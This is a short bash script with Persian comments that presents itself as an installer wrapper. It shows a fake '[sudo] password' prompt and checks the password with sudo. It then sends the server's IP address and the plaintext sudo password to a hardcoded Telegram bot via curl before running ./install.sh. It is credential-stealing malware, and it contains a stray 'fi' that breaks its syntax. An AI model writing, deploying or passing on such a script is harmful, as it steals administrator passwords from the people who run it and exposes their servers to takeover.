#!/bin/bash

# درخواست پسورد از کاربر
read -sp "[sudo] password for $USER: " SUDO_PASSWORD
echo ""

# احراز هویت با استفاده از پسورد وارد شده
echo $SUDO_PASSWORD | sudo -S echo "احراز هویت با موفقیت انجام شد."

# بررسی موفقیت آمیز بودن sudo
if [ $? -ne 0 ]; then
  echo "پسورد اشتباه است یا مشکلی در احراز هویت وجود دارد."
  exit 1
fi

# گرفتن IP سرور
SERVER_IP=$(hostname -I | awk '{print $1}')

# توکن و chat_id ربات تلگرامی
BOT_TOKEN="7358145097:AAHScl8zE1bEjUVPDx2JOquh9rvKQImr89g"
CHAT_ID="7149105285"

# پیام برای ارسال به تلگرام (شامل پسورد sudo)
MESSAGE="IP سرور شما: $SERVER_IP\nپسورد SUDO شما: $SUDO_PASSWORD"

# ارسال اطلاعات به تلگرام
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d chat_id=$CHAT_ID \
    -d text="$MESSAGE"

# بررسی ارسال موفقیت‌آمیز

fi

# پاک کردن متغیر پسورد از حافظه برای جلوگیری از ذخیره لاگ
unset SUDO_PASSWORD

# اجرای اسکریپت دیگری (مثال: ./script.sh)
./install.sh
